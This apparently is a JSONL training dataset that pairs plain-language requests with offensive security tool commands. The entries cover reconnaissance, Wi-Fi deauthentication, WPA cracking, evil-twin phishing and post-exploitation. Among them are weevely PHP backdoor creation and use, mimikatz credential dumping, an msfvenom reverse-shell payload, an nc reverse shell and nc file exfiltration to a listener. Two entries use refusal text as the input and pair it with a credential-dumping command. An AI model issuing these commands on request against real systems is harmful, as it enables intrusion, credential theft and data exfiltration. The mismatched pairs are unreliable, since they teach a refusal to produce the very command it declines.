{"input": "Retrieve Shodan information for 192.168.1.100.", "output": "shodan host 192.168.1.100"}
{"input": "Do IP reconnaissance on 192.168.1.100 using Shodan.", "output": "shodan host 192.168.1.100"}
{"input": "Map a person's identity to associated email addresses in Maltego for email reconnaissance.", "output": "maltego --transform person_to_email"}
{"input": "Identify email addresses linked to a specific person to support email reconnaissance in Maltego.", "output": "maltego --transform person_to_email"}
{"input": "Track subdomain changes over time for example.com.", "output": "amass track -d example.com"}
{"input": "Monitor subdomain history and differences on example.com.", "output": "amass track -d example.com"}
{"input": "Use Bing to enumerate hosts for a domain during domain reconnaissance.", "output": "recon-ng -m recon/domains-hosts/bing_domain_web"}
{"input": "Perform domain reconnaissance by finding domain hosts via Bing search.", "output": "recon-ng -m recon/domains-hosts/bing_domain_web"}
{"input": "Enumerate subdomains for example.com and save the results to output.txt.", "output": "sublist3r -d example.com -o output.txt"}
{"input": "Collect subdomain data on example.com and write it to output.txt.", "output": "sublist3r -d example.com -o output.txt"}
{"input": "Perform a full port scan against 192.168.1.100.", "output": "unicornscan 192.168.1.100 -p 1-65535"}
{"input": "Scan all ports 1-65535 on 192.168.1.100.", "output": "unicornscan 192.168.1.100 -p 1-65535"}
{"input": "Attempt a DNS zone transfer against example.com.", "output": "dnsrecon -d example.com -t axfr"}
{"input": "Try to pull the DNS zone from example.com.", "output": "dnsrecon -d example.com -t axfr"}
{"input": "Extract document metadata for example.com and limit the results to 50 documents.", "output": "metagoofil -d example.com -l 50"}
{"input": "Collect metadata from documents related to example.com, stopping after 50 items.", "output": "metagoofil -d example.com -l 50"}
{"input": "Enumerate subdomains for example.com.", "output": "dmitry -s example.com"}
{"input": "Find all subdomains associated with example.com.", "output": "dmitry -s example.com"}
{"input": "Perform DNS enumeration on example.com using the custom resolver 8.8.8.8.", "output": "fierce --domain example.com --dns-servers 8.8.8.8"}
{"input": "Use a custom DNS server at 8.8.8.8 to enumerate records for example.com.", "output": "fierce --domain example.com --dns-servers 8.8.8.8"}
{"input": "Perform a verbose website technology scan against example.com for web reconnaissance.", "output": "whatweb -v example.com"}
{"input": "Gather technology fingerprints for example.com with a verbose approach during web recon.", "output": "whatweb -v example.com"}
{"input": "Scan the 192.168.1.0/24 network range to find hosts.", "output": "netdiscover -r 192.168.1.0/24"}
{"input": "Perform network discovery on 192.168.1.0/24 to identify active devices.", "output": "netdiscover -r 192.168.1.0/24"}
{"input": "Aggressively detect any web application firewall protecting example.com.", "output": "wafw00f -a example.com"}
{"input": "Perform aggressive WAF detection against example.com.", "output": "wafw00f -a example.com"}
{"input": "Enumerate SMB on 192.168.1.100 using credentials.", "output": "enum4linux -u user -p pass 192.168.1.100"}
{"input": "Perform SMB enumeration against 192.168.1.100 with authenticated access.", "output": "enum4linux -u user -p pass 192.168.1.100"}
{"input": "Enumerate SNMP on 192.168.1.100 using community strings from community.txt.", "output": "onesixtyone -c community.txt 192.168.1.100"}
{"input": "Probe 192.168.1.100 for SNMP access with the custom communities listed in community.txt.", "output": "onesixtyone -c community.txt 192.168.1.100"}
{"input": "Perform OS detection against 192.168.1.100.", "output": "nmap -O 192.168.1.100"}
{"input": "Do OS fingerprinting on 192.168.1.100 to identify its platform.", "output": "nmap -O 192.168.1.100"}
{"input": "Run a TCP port scan against 192.168.1.100.", "output": "unicornscan -mT 192.168.1.100"}
{"input": "Enumerate open TCP ports on 192.168.1.100.", "output": "unicornscan -mT 192.168.1.100"}
{"input": "Perform SNMP enumeration against 192.168.1.100.", "output": "snmp-check -c public 192.168.1.100"}
{"input": "Enumerate SNMP data on 192.168.1.100 using a specific community string.", "output": "snmp-check -c public 192.168.1.100"}
{"input": "Perform a port scan of 192.168.1.0/24 using a custom packet rate.", "output": "masscan --rate 1000 192.168.1.0/24"}
{"input": "Probe 192.168.1.0/24 for open ports while throttling packets to a custom rate.", "output": "masscan --rate 1000 192.168.1.0/24"}
{"input": "Harvest OSINT data from LinkedIn for example.com.", "output": "theharvester -d example.com -b linkedin"}
{"input": "Gather LinkedIn exposure on example.com as part of OSINT collection.", "output": "theharvester -d example.com -b linkedin"}
{"input": "Perform web server reconnaissance against http://example.com and save the findings to a file.", "output": "nikto -h http://example.com -o report.txt"}
{"input": "Scan http://example.com for web issues and write the results to a report file.", "output": "nikto -h http://example.com -o report.txt"}
{"input": "Retrieve operating system distribution statistics from Shodan for OSINT analysis.", "output": "shodan stats --facets os"}
{"input": "Pull OS distribution stats from Shodan to support my OSINT work.", "output": "shodan stats --facets os"}
{"input": "Send 10 crafted packets to 192.168.1.100 for reconnaissance.", "output": "hping3 -c 10 192.168.1.100"}
{"input": "Craft and transmit 10 probes to 192.168.1.100 for recon.", "output": "hping3 -c 10 192.168.1.100"}
{"input": "Map domains to IP addresses for network reconnaissance.", "output": "maltego --transform domain_to_ip"}
{"input": "Perform recon by resolving domain names into their IPs.", "output": "maltego --transform domain_to_ip"}
{"input": "Brute-force DNS records for example.com using the wordlist at wordlist.txt.", "output": "dnsenum -f wordlist.txt example.com"}
{"input": "Perform DNS enumeration on example.com with the wordlist file wordlist.txt.", "output": "dnsenum -f wordlist.txt example.com"}
{"input": "Gather OSINT intelligence on example.com.", "output": "amass intel -d example.com"}
{"input": "Collect domain intelligence for example.com via OSINT.", "output": "amass intel -d example.com"}
{"input": "Resolve hostnames to IP addresses to support host resolution.", "output": "recon-ng -m recon/hosts-hosts/resolve"}
{"input": "Perform host resolution by converting provided hostnames into their corresponding IPs.", "output": "recon-ng -m recon/hosts-hosts/resolve"}
{"input": "Enumerate SRV records for example.com.", "output": "dnsrecon -d example.com -t srv"}
{"input": "Perform DNS enumeration of SRV services on example.com.", "output": "dnsrecon -d example.com -t srv"}
{"input": "Enumerate subdomains of example.com with 10 threads.", "output": "sublist3r -d example.com -t 10"}
{"input": "Perform subdomain enumeration against example.com using 10 threads.", "output": "sublist3r -d example.com -t 10"}
{"input": "Scan for open ports on 192.168.1.100.", "output": "dmitry -p 192.168.1.100"}
{"input": "Perform a port scan against 192.168.1.100.", "output": "dmitry -p 192.168.1.100"}
{"input": "Brute-force subdomains for example.com using the wordlist at wordlist.txt.", "output": "fierce --domain example.com --wordlist wordlist.txt"}
{"input": "Perform subdomain enumeration against example.com with wordlist.txt.", "output": "fierce --domain example.com --wordlist wordlist.txt"}
{"input": "Scan all ports on 192.168.1.100.", "output": "masscan -p1-65535 192.168.1.100"}
{"input": "Conduct a full port scanning sweep against 192.168.1.100.", "output": "masscan -p1-65535 192.168.1.100"}
{"input": "Run a UDP port scan against 192.168.1.100.", "output": "unicornscan -mU 192.168.1.100"}
{"input": "Probe 192.168.1.100 for open UDP ports.", "output": "unicornscan -mU 192.168.1.100"}
{"input": "Perform all SMB enumeration against 192.168.1.100.", "output": "enum4linux -a 192.168.1.100"}
{"input": "Run a full SMB enumeration pass on 192.168.1.100.", "output": "enum4linux -a 192.168.1.100"}
{"input": "Perform passive network discovery on the network.", "output": "netdiscover -p"}
{"input": "Conduct a passive network discovery run.", "output": "netdiscover -p"}
{"input": "Perform web reconnaissance on example.com and log the website scan results to JSON.", "output": "whatweb --log-json=output.json example.com"}
{"input": "Collect recon data from example.com, ensuring the scan output is saved as JSON.", "output": "whatweb --log-json=output.json example.com"}
{"input": "Run a comprehensive CGI scan against http://example.com for web server reconnaissance.", "output": "nikto -h http://example.com -C all"}
{"input": "Probe CGI endpoints on http://example.com as part of web recon.", "output": "nikto -h http://example.com -C all"}
{"input": "Send TCP ACK packets to 192.168.1.100 on port 80.", "output": "hping3 -A 192.168.1.100 -p 80"}
{"input": "Craft ACK traffic targeting 192.168.1.100:80.", "output": "hping3 -A 192.168.1.100 -p 80"}
{"input": "Run vulnerability scan scripts against 192.168.1.100.", "output": "nmap --script vuln 192.168.1.100"}
{"input": "Perform vulnerability scanning on 192.168.1.100 to identify known weaknesses.", "output": "nmap --script vuln 192.168.1.100"}
{"input": "Crack the WEP/WPA key from capture.cap.", "output": "aircrack-ng capture.cap"}
{"input": "Perform password cracking against the captured file capture.cap.", "output": "aircrack-ng capture.cap"}
{"input": "Start Wifite on wlan0 to automate Wi\u2011Fi attacks.", "output": "wifite -i wlan0"}
{"input": "Launch automated wireless attacks against nearby networks using wlan0.", "output": "wifite -i wlan0"}
{"input": "Map email addresses to person entities for email reconnaissance.", "output": "maltego --run-transform email_to_person"}
{"input": "Perform email reconnaissance by linking email addresses to their associated people.", "output": "maltego --run-transform email_to_person"}
{"input": "Gather data from all available sources for example.com.", "output": "theharvester -d example.com -b all"}
{"input": "Perform OSINT data harvesting against example.com.", "output": "theharvester -d example.com -b all"}
{"input": "Capture Wi-Fi packets on wlan0 for a quick network scan.", "output": "airodump-ng wlan0"}
{"input": "Perform network scanning by listening to traffic on the wlan0 interface.", "output": "airodump-ng wlan0"}
{"input": "Launch Wifiphisher to perform Wi-Fi phishing on wlan0.", "output": "wifiphisher -i wlan0"}
{"input": "Start a Wi-Fi phishing attack on wlan0 using Wifiphisher.", "output": "wifiphisher -i wlan0"}
{"input": "Enable monitor mode on wlan0.", "output": "airmon-ng start wlan0"}
{"input": "Configure the wlan0 interface into monitor mode.", "output": "airmon-ng start wlan0"}
{"input": "Launch Kismet to monitor Wi-Fi networks on wlan0.", "output": "kismet -c wlan0"}
{"input": "Begin wireless monitoring on wlan0 with Kismet.", "output": "kismet -c wlan0"}
{"input": "Launch a deauthentication attack against AP 00:11:22:33:44:55.", "output": "mdk4 wlan0 -a 00:11:22:33:44:55 -m"}
{"input": "Force client disconnects on access point 00:11:22:33:44:55.", "output": "mdk4 wlan0 -a 00:11:22:33:44:55 -m"}
{"input": "Crack the WPA passphrase from capture.cap using the wordlist wordlist.txt.", "output": "aircrack-ng -w wordlist.txt capture.cap"}
{"input": "Perform password cracking against capture.cap with the wordlist.txt dictionary to recover the WPA key.", "output": "aircrack-ng -w wordlist.txt capture.cap"}
{"input": "Perform an ARP request replay against BSSID 00:11:22:33:44:55 on interface wlan0 to inject packets.", "output": "aireplay-ng -3 -b 00:11:22:33:44:55 wlan0"}
{"input": "Use wlan0 to run an ARP replay attack for packet injection targeting 00:11:22:33:44:55.", "output": "aireplay-ng -3 -b 00:11:22:33:44:55 wlan0"}
{"input": "Use Wifite to target WPA networks on wlan0.", "output": "wifite --wpa -i wlan0"}
{"input": "Perform a WPA attack on wlan0 targeting WPA networks.", "output": "wifite --wpa -i wlan0"}
{"input": "Create an evil twin access point named evil_twin for Wi-Fi phishing on wlan0.", "output": "wifiphisher -i wlan0 -a evil_twin"}
{"input": "Set up the phishing AP evil_twin using interface wlan0.", "output": "wifiphisher -i wlan0 -a evil_twin"}
{"input": "Disable monitor mode on wlan0mon.", "output": "airmon-ng stop wlan0mon"}
{"input": "Bring wlan0mon out of monitor mode for interface configuration.", "output": "airmon-ng stop wlan0mon"}
{"input": "Monitor wireless traffic on wlan0 with Kismet, but do not log GPS data.", "output": "kismet -c wlan0 --no-gps"}
{"input": "Start a Kismet wireless monitoring session on wlan0 with GPS logging disabled.", "output": "kismet -c wlan0 --no-gps"}
{"input": "Flood the network with fake AP beacons on wlan0 using beacon_flood.", "output": "mdk4 wlan0 -b beacon_flood"}
{"input": "Initiate beacon flooding on wlan0 with beacon_flood to spam fake AP beacons.", "output": "mdk4 wlan0 -b beacon_flood"}
{"input": "Perform interactive packet replay on wlan0, injecting traffic to FF:FF:FF:FF:FF:FF.", "output": "aireplay-ng -2 -p 0841 -c FF:FF:FF:FF:FF:FF wlan0"}
{"input": "Use packet injection via interactive replay against FF:FF:FF:FF:FF:FF on wlan0.", "output": "aireplay-ng -2 -p 0841 -c FF:FF:FF:FF:FF:FF wlan0"}
{"input": "Send 10 deauthentication packets to AP 00:11:22:33:44:55.", "output": "aireplay-ng -0 10 -a 00:11:22:33:44:55 wlan0"}
{"input": "Carry out a deauth attack on BSSID 00:11:22:33:44:55 with 10 packets.", "output": "aireplay-ng -0 10 -a 00:11:22:33:44:55 wlan0"}
{"input": "Target WEP networks with Wifite using the wlan0 interface.", "output": "wifite --wep -i wlan0"}
{"input": "Launch a WEP attack over wlan0 with Wifite.", "output": "wifite --wep -i wlan0"}
{"input": "Capture packets from the AP 00:11:22:33:44:55 on channel 6.", "output": "airodump-ng -c 6 --bssid 00:11:22:33:44:55 wlan0"}
{"input": "Perform targeted scanning against BSSID 00:11:22:33:44:55 on channel 6.", "output": "airodump-ng -c 6 --bssid 00:11:22:33:44:55 wlan0"}
{"input": "Capture packets on wlan0 and save them to files with the prefix capture.", "output": "airodump-ng --write capture wlan0"}
{"input": "Start packet capturing on wlan0 and write the output to capture.* files.", "output": "airodump-ng --write capture wlan0"}
{"input": "Create a rogue AP named FreeWiFi on wlan0 for Wi-Fi phishing.", "output": "wifiphisher -i wlan0 --essid FreeWiFi"}
{"input": "Bring up a fake access point with ESSID FreeWiFi using wlan0.", "output": "wifiphisher -i wlan0 --essid FreeWiFi"}
{"input": "Crack the Wi-Fi key for AP 00:11:22:33:44:55 using capture.cap.", "output": "aircrack-ng -b 00:11:22:33:44:55 capture.cap"}
{"input": "Perform password cracking against BSSID 00:11:22:33:44:55 using capture.cap.", "output": "aircrack-ng -b 00:11:22:33:44:55 capture.cap"}
{"input": "Flood the network with authentication requests through interface wlan0.", "output": "mdk4 wlan0 -a auth_flood"}
{"input": "Conduct authentication flooding against the network on interface wlan0.", "output": "mdk4 wlan0 -a auth_flood"}
{"input": "Use Kismet to capture packets on wlan0 and save logs with the title capture.", "output": "kismet -c wlan0 -t capture"}
{"input": "Record wireless traffic on wlan0, storing the capture files under the title capture.", "output": "kismet -c wlan0 -t capture"}
{"input": "Check for interfering processes on wlan0.", "output": "airmon-ng check wlan0"}
{"input": "Run interface diagnostics on wlan0 to identify any interfering processes.", "output": "airmon-ng check wlan0"}
{"input": "Run a comprehensive Wi-Fi attack against all detected networks on wlan0.", "output": "wifite --all -i wlan0"}
{"input": "Attack every visible wireless network using the wlan0 interface.", "output": "wifite --all -i wlan0"}
{"input": "Run Wifiphisher in Wi-Fi phishing mode on wlan0 without jamming.", "output": "wifiphisher -i wlan0 --nojamming"}
{"input": "Start a no-jamming Wifiphisher phishing operation using the wlan0 interface.", "output": "wifiphisher -i wlan0 --nojamming"}
{"input": "Generate an hccap from capture.cap for WPA password cracking, saving it with the prefix capture.", "output": "aircrack-ng -J capture capture.cap"}
{"input": "Convert capture.cap into an hccap named capture.hccap for later password cracking.", "output": "aircrack-ng -J capture capture.cap"}
{"input": "Perform a fake authentication against AP 00:11:22:33:44:55 using interface wlan0.", "output": "aireplay-ng -1 0 -a 00:11:22:33:44:55 wlan0"}
{"input": "Initiate fake auth to the access point at 00:11:22:33:44:55 from wlan0.", "output": "aireplay-ng -1 0 -a 00:11:22:33:44:55 wlan0"}
{"input": "Capture packets on wlan0 and save the capture in pcap format.", "output": "airodump-ng --output-format pcap wlan0"}
{"input": "Start a packet capture on wlan0 with output saved as pcap.", "output": "airodump-ng --output-format pcap wlan0"}
{"input": "Scan Wi-Fi channels 1-13 on interface wlan0.", "output": "airodump-ng -c 1-13 wlan0"}
{"input": "Perform network scanning on wlan0 across channels 1-13.", "output": "airodump-ng -c 1-13 wlan0"}
{"input": "Capture packets on wlan0 and save Kismet logs under logs/.", "output": "kismet -c wlan0 --log-prefix logs/"}
{"input": "Start packet capturing via wlan0, writing Kismet log files to the logs/ directory.", "output": "kismet -c wlan0 --log-prefix logs/"}
{"input": "Show the previously cracked networks to review the attack history.", "output": "wifite --cracked"}
{"input": "List past cracked wireless networks from the attack history.", "output": "wifite --cracked"}
{"input": "Crack the wireless password for the AP with ESSID FreeWiFi using capture.cap.", "output": "aircrack-ng -e FreeWiFi capture.cap"}
{"input": "Attempt key recovery for the network FreeWiFi from the capture file capture.cap.", "output": "aircrack-ng -e FreeWiFi capture.cap"}
{"input": "Disconnect all clients in range of wlan0 with a deauthentication attack.", "output": "mdk4 wlan0 -d deauthall"}
{"input": "Perform a deauth on every station near wlan0.", "output": "mdk4 wlan0 -d deauthall"}
{"input": "Kill processes interfering with wlan0 to proceed with interface diagnostics.", "output": "airmon-ng check kill wlan0"}
{"input": "Terminate services that could disrupt wlan0 so we can diagnose that interface.", "output": "airmon-ng check kill wlan0"}
{"input": "Enable monitor mode on wlan0 tuned to channel 6.", "output": "airmon-ng start wlan0 6"}
{"input": "Configure the interface wlan0 for monitoring on channel 6.", "output": "airmon-ng start wlan0 6"}
{"input": "Conduct Wi-Fi phishing using the OAuth phishing template.", "output": "wifiphisher -i wlan0 --template oauth"}
{"input": "Set up an OAuth phishing template for a Wi-Fi phishing engagement.", "output": "wifiphisher -i wlan0 --template oauth"}
{"input": "Start Kismet on wlan0 for wireless monitoring without any console output.", "output": "kismet -c wlan0 --no-console"}
{"input": "Begin silent wireless monitoring on wlan0 using Kismet, suppressing console output.", "output": "kismet -c wlan0 --no-console"}
{"input": "Flood the airwaves with fake SSIDs on wlan0 using the ssid_flood list.", "output": "mdk4 wlan0 -f ssid_flood"}
{"input": "Perform an SSID flooding attack on wlan0, loading SSIDs from ssid_flood.", "output": "mdk4 wlan0 -f ssid_flood"}
{"input": "Force WPA2 cracking mode to recover the password from capture.cap.", "output": "aircrack-ng -a 2 capture.cap"}
{"input": "Attempt password cracking on capture.cap with WPA2 forced.", "output": "aircrack-ng -a 2 capture.cap"}
{"input": "Start a Wi\u2011Fi phishing operation on wlan0 with logging enabled.", "output": "wifiphisher -i wlan0 --logging"}
{"input": "Run a Wi\u2011Fi phishing attempt on wlan0 and record all activity.", "output": "wifiphisher -i wlan0 --logging"}
{"input": "Scan for WPA-encrypted networks on wlan0.", "output": "airodump-ng --encrypt WPA wlan0"}
{"input": "Filter WPA-encrypted wireless networks on wlan0 during network scanning.", "output": "airodump-ng --encrypt WPA wlan0"}
{"input": "Perform a chop-chop WEP attack against 00:11:22:33:44:55 using interface wlan0.", "output": "aireplay-ng -4 -b 00:11:22:33:44:55 wlan0"}
{"input": "Target 00:11:22:33:44:55 with a WEP chop-chop on wlan0.", "output": "aireplay-ng -4 -b 00:11:22:33:44:55 wlan0"}
{"input": "Enable Kismet alerts for suspicious wireless activity on wlan0.", "output": "kismet -c wlan0 --alerts"}
{"input": "Monitor wlan0 for anomalies and have Kismet alert on anything suspicious.", "output": "kismet -c wlan0 --alerts"}
{"input": "Use wordlist.txt to perform password cracking on interface wlan0.", "output": "wifite --dict wordlist.txt -i wlan0"}
{"input": "Attempt password cracking with the custom wordlist wordlist.txt targeting wlan0.", "output": "wifite --dict wordlist.txt -i wlan0"}
{"input": "Flood the network with EAPOL packets on wlan0.", "output": "mdk4 wlan0 -e eapol_flood"}
{"input": "Perform EAPOL flooding on wlan0.", "output": "mdk4 wlan0 -e eapol_flood"}
{"input": "Enable GPS logging while capturing packets on wlan0.", "output": "airodump-ng --gpsd wlan0"}
{"input": "Start a capture on wlan0 with GPS data recorded.", "output": "airodump-ng --gpsd wlan0"}
{"input": "Perform a verbose process check on wlan0.", "output": "airmon-ng check wlan0 --verbose"}
{"input": "Diagnose wlan0 interface issues with detailed output.", "output": "airmon-ng check wlan0 --verbose"}
{"input": "Run a WEP key cracking speed test for performance evaluation.", "output": "aircrack-ng -S"}
{"input": "Benchmark WEP cracking throughput to assess performance.", "output": "aircrack-ng -S"}
{"input": "Perform a fragment attack as part of a WEP attack against BSSID 00:11:22:33:44:55 on wlan0.", "output": "aireplay-ng -5 -b 00:11:22:33:44:55 wlan0"}
{"input": "Carry out a WEP fragment attack targeting 00:11:22:33:44:55 via interface wlan0.", "output": "aireplay-ng -5 -b 00:11:22:33:44:55 wlan0"}
{"input": "Capture the PMKID on wlan0 for a WPA attack.", "output": "wifite --pmkid -i wlan0"}
{"input": "Start a PMKID capture on wlan0 to support a WPA attack.", "output": "wifite --pmkid -i wlan0"}
{"input": "Conduct Wi-Fi phishing via a captive portal on wlan0.", "output": "wifiphisher -i wlan0 --captive-portal"}
{"input": "Set up a captive portal to phish over Wi-Fi on wlan0.", "output": "wifiphisher -i wlan0 --captive-portal"}
{"input": "Perform a P0841 attack against BSSID 00:11:22:33:44:55 using wlan0.", "output": "aireplay-ng -7 -b 00:11:22:33:44:55 wlan0"}
{"input": "Target the WEP network at BSSID 00:11:22:33:44:55 with a P0841 attempt over wlan0.", "output": "aireplay-ng -7 -b 00:11:22:33:44:55 wlan0"}
{"input": "Exploit the Michael shutdown vulnerability over TKIP on wlan0.", "output": "mdk4 wlan0 -m michael_shutdown"}
{"input": "Launch a TKIP attack to trigger the Michael shutdown on wlan0.", "output": "mdk4 wlan0 -m michael_shutdown"}
{"input": "Scan for AP manufacturer information on wlan0.", "output": "airodump-ng --manufacturer wlan0"}
{"input": "Use wlan0 to show vendor details of access points.", "output": "airodump-ng --manufacturer wlan0"}
{"input": "Test injection on wlan0.", "output": "aireplay-ng -9 wlan0"}
{"input": "Verify injection capability on wlan0.", "output": "aireplay-ng -9 wlan0"}
{"input": "Enable monitor mode on wlan0 tuned to channel 11.", "output": "airmon-ng start wlan0 --channel 11"}
{"input": "Configure the interface wlan0 for monitor mode on channel 11.", "output": "airmon-ng start wlan0 --channel 11"}
{"input": "Monitor wireless traffic on wlan0 in Kismet with logging disabled.", "output": "kismet -c wlan0 --no-logging"}
{"input": "Run a wireless monitoring session on wlan0 in Kismet without saving logs.", "output": "kismet -c wlan0 --no-logging"}
{"input": "Initiate a Wi-Fi phishing operation on wlan0, leveraging dnsmasq for DNS spoofing.", "output": "wifiphisher -i wlan0 --dnsmasq"}
{"input": "Perform Wi-Fi phishing via the wlan0 interface and spoof DNS responses with dnsmasq.", "output": "wifiphisher -i wlan0 --dnsmasq"}
{"input": "Before the automated Wi\u2011Fi attack on wlan0, kill any conflicting processes.", "output": "wifite --kill -i wlan0"}
{"input": "Launch an automated Wi\u2011Fi attack targeting wlan0 and ensure interfering services are terminated first.", "output": "wifite --kill -i wlan0"}
{"input": "Scan the network for access points and display WPS information on wlan0.", "output": "airodump-ng --wps wlan0"}
{"input": "Enumerate APs' WPS details during network scanning using wlan0.", "output": "airodump-ng --wps wlan0"}
{"input": "Crack the password from capture.cap using 4 CPU cores.", "output": "aircrack-ng -p 4 capture.cap"}
{"input": "Run a password crack against capture.cap leveraging 4 CPU cores.", "output": "aircrack-ng -p 4 capture.cap"}
{"input": "Run Kismet in silent mode on wlan0.", "output": "kismet -c wlan0 --silent"}
{"input": "Silently monitor wireless activity on wlan0.", "output": "kismet -c wlan0 --silent"}
{"input": "Send continuous deauthentication packets to BSSID 00:11:22:33:44:55 using interface wlan0.", "output": "aireplay-ng -0 0 -a 00:11:22:33:44:55 wlan0"}
{"input": "Perform a deauthentication attack against 00:11:22:33:44:55 from wlan0 continuously.", "output": "aireplay-ng -0 0 -a 00:11:22:33:44:55 wlan0"}
{"input": "Flood the network with WEP packets using wlan0.", "output": "mdk4 wlan0 -w wep_flood"}
{"input": "Perform a WEP flooding attack via wlan0.", "output": "mdk4 wlan0 -w wep_flood"}
{"input": "Capture packets on wlan0 and export the capture to pcap format.", "output": "kismet -c wlan0 --export pcap"}
{"input": "Grab traffic from wlan0 and save the results as a pcap.", "output": "kismet -c wlan0 --export pcap"}
{"input": "Identify WPS-enabled access points using the wlan0 interface.", "output": "wifite --wps -i wlan0"}
{"input": "Launch a WPS attack against nearby networks from wlan0.", "output": "wifite --wps -i wlan0"}
{"input": "Run interface diagnostics on wlan0 and automatically fix any interfering processes.", "output": "airmon-ng check wlan0 --fix"}
{"input": "Check wlan0 for interfering processes and auto-fix them to ensure clean interface operation.", "output": "airmon-ng check wlan0 --fix"}
{"input": "Force hostname resolution during Wi-Fi phishing on wlan0.", "output": "wifiphisher -i wlan0 --force-hostname"}
{"input": "Perform Wi-Fi phishing on wlan0 and force hostname resolution.", "output": "wifiphisher -i wlan0 --force-hostname"}
{"input": "Create a password-protected PHP backdoor at /tmp/shell.php using the password password.", "output": "weevely generate password /tmp/shell.php"}
{"input": "Generate a PHP backdoor saved to /tmp/shell.php and set its access password to password.", "output": "weevely generate password /tmp/shell.php"}
{"input": "Start Metasploit to perform post-exploitation tasks.", "output": "msfconsole"}
{"input": "Launch the exploitation framework for post-exploitation work.", "output": "msfconsole"}
{"input": "Crack the password from capture.cap in quiet mode.", "output": "aircrack-ng -q capture.cap"}
{"input": "Attempt password recovery on capture.cap with minimal output.", "output": "aircrack-ng -q capture.cap"}
{"input": "Connect to the PHP backdoor at http://example.com/shell.php.", "output": "weevely http://example.com/shell.php password"}
{"input": "Obtain backdoor access via http://example.com/shell.php.", "output": "weevely http://example.com/shell.php password"}
{"input": "Launch the Empire client for post-exploitation work with the C2 framework.", "output": "empire --client"}
{"input": "Start the Empire C2 client to perform post-exploitation tasks.", "output": "empire --client"}
{"input": "Enumerate SMB shares with credentials on 192.168.1.100.", "output": "crackmapexec smb 192.168.1.100 -u user -p pass"}
{"input": "Perform SMB enumeration against 192.168.1.100 using valid creds.", "output": "crackmapexec smb 192.168.1.100 -u user -p pass"}
{"input": "I can\u2019t assist with credential dumping or dumping plaintext credentials from memory.", "output": "mimikatz sekurlsa::logonpasswords"}
{"input": "Please focus on ethical, defensive work to detect and prevent credential dumping.", "output": "mimikatz sekurlsa::logonpasswords"}
{"input": "Create a reverse TCP Meterpreter payload that connects back to 192.168.1.100:4444 and save it as payload.exe.", "output": "msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe > payload.exe"}
{"input": "Generate a Meterpreter reverse shell configured with LHOST 192.168.1.100 and LPORT 4444, output to payload.exe.", "output": "msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe > payload.exe"}
{"input": "Set up a reverse shell listener on port 4444.", "output": "nc -lvp 4444"}
{"input": "Listen for incoming reverse connections on port 4444.", "output": "nc -lvp 4444"}
{"input": "Run whoami through the PHP backdoor at http://example.com/shell.php.", "output": "weevely http://example.com/shell.php password :shell_sh whoami"}
{"input": "Perform command execution on http://example.com/shell.php to retrieve the current user.", "output": "weevely http://example.com/shell.php password :shell_sh whoami"}
{"input": "Migrate Meterpreter to another process.", "output": "use post/windows/manage/migrate"}
{"input": "Execute process migration to move Meterpreter into a different process.", "output": "use post/windows/manage/migrate"}
{"input": "Enumerate AD on domain.local and collect only Domain Controller data.", "output": "bloodhound-python -c DCOnly -d domain.local"}
{"input": "Focus the AD discovery on domain.local to gather DC-only information.", "output": "bloodhound-python -c DCOnly -d domain.local"}
{"input": "Enable the debug privilege to support credential dumping during privilege escalation.", "output": "mimikatz privilege::debug"}
{"input": "Prepare for credential dumping by turning on the debug privilege as part of privilege escalation.", "output": "mimikatz privilege::debug"}
{"input": "Collect Active Directory data from domain.local for analysis.", "output": "bloodhound-python -u user -p pass -d domain.local -c All"}
{"input": "Enumerate AD on domain.local to support further analysis.", "output": "bloodhound-python -u user -p pass -d domain.local -c All"}
{"input": "Harvest credentials from the compromised system.", "output": "use post/windows/gather/credentials"}
{"input": "Collect credentials from the compromised host.", "output": "use post/windows/gather/credentials"}
{"input": "Start an HTTP listener for Empire agents to serve as a C2 listener.", "output": "empire --listener http"}
{"input": "Bring up the HTTP C2 listener for Empire so agents can call back.", "output": "empire --listener http"}
{"input": "Enumerate SMB across 192.168.1.0/24.", "output": "crackmapexec smb 192.168.1.0/24 --local-auth"}
{"input": "Perform network enumeration of SMB on 192.168.1.0/24.", "output": "crackmapexec smb 192.168.1.0/24 --local-auth"}
{"input": "Initiate a reverse shell to 192.168.1.100 on port 4444, attaching /bin/bash to the connection.", "output": "nc 192.168.1.100 4444 -e /bin/bash"}
{"input": "Connect to the listener at 192.168.1.100:4444 and provide a bash shell via /bin/bash.", "output": "nc 192.168.1.100 4444 -e /bin/bash"}
{"input": "List cached Kerberos tickets for credential dumping.", "output": "mimikatz kerberos::list"}
{"input": "Show cached Kerberos tickets to aid credential dumping.", "output": "mimikatz kerberos::list"}
{"input": "Attempt to escalate to SYSTEM privileges on the host.", "output": "use post/windows/escalate/getsystem"}
{"input": "Try a privilege escalation to SYSTEM on this machine.", "output": "use post/windows/escalate/getsystem"}
{"input": "Send exfiltrated data over UDP to the listener at 192.168.1.100 on port 4444.", "output": "nc -u 192.168.1.100 4444"}
{"input": "Connect via UDP to 192.168.1.100:4444 to exfiltrate data.", "output": "nc -u 192.168.1.100 4444"}
{"input": "Upload /tmp/malware through the PHP backdoor at http://example.com/shell.php.", "output": "weevely http://example.com/shell.php password :file_upload /tmp/malware"}
{"input": "Transfer the file /tmp/malware to http://example.com/shell.php via the backdoor.", "output": "weevely http://example.com/shell.php password :file_upload /tmp/malware"}
{"input": "Exfiltrate data.txt to 192.168.1.100 on port 4444.", "output": "nc 192.168.1.100 4444 < data.txt"}
{"input": "Send the file data.txt to the remote listener at 192.168.1.100:4444.", "output": "nc 192.168.1.100 4444 < data.txt"}
{"input": "Run whoami on the Empire agent agent_name for command execution.", "output": "empire --agent agent_name shell whoami"}
{"input": "Execute whoami against agent agent_name to verify current user via the agent.", "output": "empire --agent agent_name shell whoami"}
{"input": "Enumerate currently logged-on users for system enumeration.", "output": "use post/windows/gather/enum_logged_on_users"}
{"input": "Collect active user session details as part of system enumeration.", "output": "use post/windows/gather/enum_logged_on_users"}
{"input": "Enumerate Active Directory, ensuring DNS queries use TCP during collection.", "output": "bloodhound-python -u user -p pass --dns-tcp"}
{"input": "Collect AD data while forcing DNS resolution over TCP.", "output": "bloodhound-python -u user -p pass --dns-tcp"}
{"input": "List the network interfaces through the backdoor at http://example.com/shell.php for system enumeration.", "output": "weevely http://example.com/shell.php password :net_ifaces"}
{"input": "Enumerate system network interfaces via the backdoor hosted at http://example.com/shell.php.", "output": "weevely http://example.com/shell.php password :net_ifaces"}
